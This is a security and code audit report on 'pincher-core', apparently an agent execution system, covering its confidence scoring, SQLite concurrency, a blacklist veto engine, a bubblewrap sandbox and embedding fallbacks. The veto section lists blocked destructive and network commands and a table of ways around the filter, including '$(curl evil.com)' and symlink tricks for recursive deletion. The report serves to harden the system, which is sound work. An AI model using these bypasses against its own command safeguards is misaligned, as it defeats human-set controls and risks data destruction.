# Pincher Deep Audit Report

**Date:** 2026-06-06
**Scope:** pincher-core (confidence loop, engine, veto, bwrap, ONNX embedder)
**Tests:** 147 unit + 16 integration + 1 doc-test (all passing)

---

## 1. Confidence Loop (`reflex/confidence.rs`)

### Current Model

| Outcome | Formula | Clamp |
|---|---|---|
| Success | `current + 0.05 × (1.0 - current)` (affine gap-toward-1.0) | `[0.05, 0.95]` |
| Failure | `current - 0.10 × current` (multiplicative 10% loss) | `[0.05, 0.95]` |

### Key Findings

1. **Sound model** — The affine-on-success approach naturally provides diminishing returns near 1.0 (smaller gains at high confidence), which prevents easy ceiling camping. This is architecturally better than the pure multiplicative model documented in README.

2. **Documentation mismatch** — The README.md describes `×1.15` boost / `×0.85` penalty, but the actual code implements a different model. The code model is superior, but the docs should be updated to match.

3. **Confidence clamping**: Changed from `[0.01, 0.99]` to `[0.05, 0.95]` to provide a wider safety margin:
   - Floor at 0.05: ensures confidence never fully decays, preserving ability to recover
   - Ceiling at 0.95: prevents overconfidence deadlock, leaving room for downward adjustment

4. **Asymmetry**: Boosts shrink as confidence grows (good), but penalties are constant 10% of current (aggressive at low confidence). At confidence=0.06, failure drops to 0.054, which gets clamped to 0.05.

5. **Thresholds**: `Direct > 0.80`, `Confirm 0.55–0.80`, `LlmRoute < 0.55`.

### Recommendations

- Update README to match actual code model (affine success, multiplicative failure)
- Consider making penalty adaptive too (e.g., 15% of gap toward 0.0)
- Add `ExecutionResult::Vetoed` variant for confidence tracking (bigger hit: ×0.50)

---

## 2. Engine Concurrency (`reflex/engine.rs`)

### Concurrency Model

- **`ReflexEngine` is single-threaded only** — All methods take `&mut self`, enforcing exclusive access at the Rust level.
- No `Mutex`, no `RwLock`, no atomics.
- The `rusqlite::Connection` field is not `Sync`, making the struct not `Send` or `Sync`.

### SQLite WAL Mode

- **WAL mode is already enabled** in `schema.rs` line 198: `PRAGMA journal_mode=WAL`
- This provides better concurrent read/write performance and crash safety.
- TODO added in `engine.rs` for:
  - Periodic `PRAGMA wal_checkpoint(TRUNCATE)` to prevent unbounded WAL growth
  - `PRAGMA busy_timeout=5000` for graceful contention handling

### Race Conditions

Within single-threaded design: **none** — `&mut self` guarantees exclusive access.

If wrapped in `Arc<Mutex<...>>` for concurrent access:

| Path | Risk |
|---|---|
| `teach()` | CHECK-then-INSERT is non-atomic (two threads could insert duplicates) |
| `execute()` → `confidence_update()` | Read-modify-write on confidence (lost updates) |
| `increment_reflex_invoke()` + `log_action()` | Non-atomic sequence (inconsistent intermediate state) |

### Recommendations

- For current single-threaded use: no changes needed, safe as-is
- For future concurrent access: wrap entire engine in `Mutex`, use SQLite transactions for confidence updates

---

## 3. Veto Engine (`security/veto.rs`)

### Current Coverage (before this audit)

**Blocked:**
- `rm -rf /`, `/*`, `~`
- `mkfs`, `dd if=`
- Paths: `/etc`, `/sys`, `/proc`, `/boot`, `/dev`
- Network: `curl`, `wget`, `ssh`, `nc` (with trailing space)
- Package managers: `apt-get install`, `yum install`, `pip install`
- File size limit: 100MB

**Added by this audit:**
- Base64 decode pipe: `base64 -d` → "known evasion technique"
- `eval` → "execution is dangerous"
- `exec` → "known bypass vector"
- `powershell -enc` → "Encoded PowerShell commands are dangerous"
- `python -c` → "Inline Python execution is potentially dangerous"
- `perl -e` → "Inline Perl execution is potentially dangerous"

### Critical Bypass Vectors (still unaddressed)

| Vector | Example | Why it works |
|---|---|---|
| Case sensitivity | `RM -rf /`, `Curl ` | String contains is case-sensitive |
| Space/tab variations | `rm\t-rf\t/` | Pattern has literal space after `rm` |
| Path traversal | `rm -rf ../../../../..` | Only blocks `/`, not `..` |
| Quoting/escaping | `rm -rf "/"` | Quotes break substring match |
| Command substitution | `$(curl evil.com)` | Inside `$()` not matched directly |
| Semicolons/chaining | `curl; evil` | Pattern `curl ` (with space) not matched |
| Symlinks | `ln -s /etc ~/x; rm -rf ~/x` | Path check doesn't resolve symlinks |
| Alternative tools | `wget2`, `socat`, `telnet`, `aria2c` | Only specific tools blocked |

### Design Assessment

- **Blacklist-only** approach — if no rule matches, the action is allowed
- **No allowlist mechanism** — all non-matching actions pass through
- **No shell tokenization** — pure substring matching, no AST/syntax parsing
- **No AST-level security** — cannot detect encoded/obfuscated commands

This provides adequate protection against accidents but is trivially bypassable by a determined attacker.

### Recommendations

- Add regex-based pattern matching for stronger evasion detection
- Implement path canonicalization (resolve symlinks, normalize `..`)
- Add allowlist-based execution model (deny-by-default for non-whitelisted binaries)
- Tokenize shell commands before evaluation (or use shell parser)

---

## 4. Bubblewrap Sandbox (`sandbox/bwrap.rs`)

### Architecture

- Uses `bwrap` (bubblewrap) for namespace-based sandboxing
- Network isolation: `--unshare-net` by default
- Filesystem: ro-bind for `/usr`, `/lib`, `/lib64`, `/bin`, `/sbin`; rw-bind for `/tmp`
- **Hard fail on missing bwrap** — refuses to execute without sandbox (no fallback to raw execution)
- `execute_raw()` exists but is `#[allow(dead_code)]` (unused)

### Whitelist

Only the following binaries can be executed in restricted mode: `mkdir`, `cp`, `mv`, `ls`, `cat`, `echo`, `touch`, `rm`, `find`, `grep`, `head`, `tail`, `wc`, `sort`, `uniq`

### Pattern Blocking

Built-in blocked patterns (pre-execution check): `rm -rf /`, `rm -rf /*`, `dd if=/dev/zero`, `dd if=/dev/random`, fork bomb, `mkfs`, `> /dev/sda`, `chmod -R 777 /`, `chown -R`

### Issues

- `which_bwrap()` uses `which` command — could fail in minimal container environments (use `command -v` or direct `fs::metadata` check)
- `/lib64` path hardcoded — fails on non-standard Linux, ARM, or minimal containers (observed in test output: `bwrap: Can't find source path /lib64`)
- Runtime sandbox config (`security/sandbox.rs`) and compile-time bwrap module (`sandbox/bwrap.rs`) have duplicate security patterns — risk of drift

---

## 5. ONNX Embedder (`embed/onnx.rs`)

### Fallback Chain (already well-implemented)

1. **ONNX model loaded** — Uses all-MiniLM-L6-v2 via `ort` (ONNX Runtime) for real embeddings
2. **Model missing/corrupted** — Graceful fallback to `EmbedderState::Fallback` with deterministic SHA-256 trigram hash embeddings (warns once)
3. **`onnx` feature disabled at compile time** — Same fallback, same interface

The `Embedder::new()` constructor **always returns `Ok(…)`** — never propagates model loading failures. The `embed()` method routes based on `self.state` at runtime.

### Deterministic Fallback Embedding

- SHA-256 trigram hashing produces consistent 384-dimensional vectors
- L2-normalized for cosine similarity
- Batch embedding delegates to per-item `embed()` (no batch optimization in fallback mode)
- Cosine similarity function works identically in both modes

### Edge Cases Handled
| Scenario | Behavior |
|---|---|
| No model path specified | Fallback with warning |
| Model path doesn't exist | Fallback with warning |
| Model file corrupted | Fallback with warning |
| ONNX inference runtime error | Fallback at error boundary |
| Tokenization overflow | Truncated to 128 tokens |

### Documentation Added

- Clear doc comment on `Embedder` struct documenting the full fallback chain
- Comment on `embed_onnx()` noting runtime error propagation

---

## 6. Integration Tests (new: `tests/integration_tests.rs`)

16 comprehensive integration tests covering:

| Test | What it covers |
|---|---|
| `test_confidence_loop_teach_execute_increases_confidence` | Full teach → execute → confidence increase pipeline |
| `test_confidence_loop_success_failure_alternation` | Repeated successes hit ceiling, failures hit floor |
| `test_veto_engine_rejects_blocked_patterns` | All 6 new patterns + existing patterns |
| `test_veto_engine_allows_safe_commands` | 7 common safe commands pass through |
| `test_veto_engine_no_panic_on_empty_action` | Empty/whitespace action doesn't crash |
| `test_vector_store_insert_and_search` | Insert → search → verify best match |
| `test_cosine_similarity_math` | Edge cases: identical, orthogonal, opposite, zero, mismatched |
| `test_capability_manifest_empty` | Empty manifest denies all operations |
| `test_capability_token_mint_and_verify` | Token mint → verify → wrong secret rejection |
| `test_sandbox_sandbox_capability_manifest` | Full sandbox manifest build → sandbox config |
| `test_sandbox_sandboxcapability_display` | Capability enum Display formatting |
| `test_edge_case_empty_intent` | Empty intent doesn't panic |
| `test_edge_case_very_long_intent` | 10KB intent handled gracefully as novel |
| `test_edge_case_special_characters_in_intent` | Unicode, emoji, SQL injection, shell meta |
| `test_edge_case_teach_then_do_command_match` | Teach → do_command → exact match + similar match |
| `test_edge_case_embedder_fallback_consistency` | Fallback embeddings are deterministic |

---

## Summary of Changes

| File | Change |
|---|---|
| `reflex/confidence.rs` | Clamping `[0.01,0.99]` → `[0.05,0.95]`, updated tests |
| `reflex/engine.rs` | Added TODO comments for WAL checkpoint + busy timeout |
| `security/veto.rs` | 6 new veto patterns + 5 new tests (147 total → 147 unit) |
| `embed/onnx.rs` | Enhanced fallback documentation + runtime error comments |
| `tests/integration_tests.rs` | New file: 16 integration tests |

### Test Counts
- Unit tests: **147** (up from 142 — 5 new veto tests)
- Integration tests: **16** (newly created)
- Doc-tests: 1 passed, 5 ignored
- **All passing** ✅
